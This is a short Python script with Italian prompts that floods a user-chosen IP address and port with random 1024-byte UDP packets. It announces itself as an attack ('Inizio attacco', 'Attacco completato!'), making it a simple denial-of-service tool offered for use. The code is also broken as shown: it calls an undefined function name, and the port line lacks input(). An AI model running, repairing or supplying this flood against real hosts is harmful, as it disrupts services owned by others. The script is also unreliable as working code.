import random
import socket
import time

def pacchetti(ip_target, porta_target, numero_pacchetti):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    print(str(time.time()) + "Inizio attacco")

    for x in range(numero_pacchetti):
        dati_da_inviare = random._urandom(1024)
        s.sendto(dati_da_inviare, (ip_target, porta_target))
        print(str(time.time()) + " - Invio " + str(x))
        time.sleep(random.random() * 0.1)

ip_target = input("Inserisci IP TARGET")
porta_target = int("Inserisci la porta")
numero_pacchetti = int(input("Inserisci quanti pacchetti inviare"))

invia_pacchetti(ip_target, porta_target, numero_pacchetti)

print("Attacco completato!")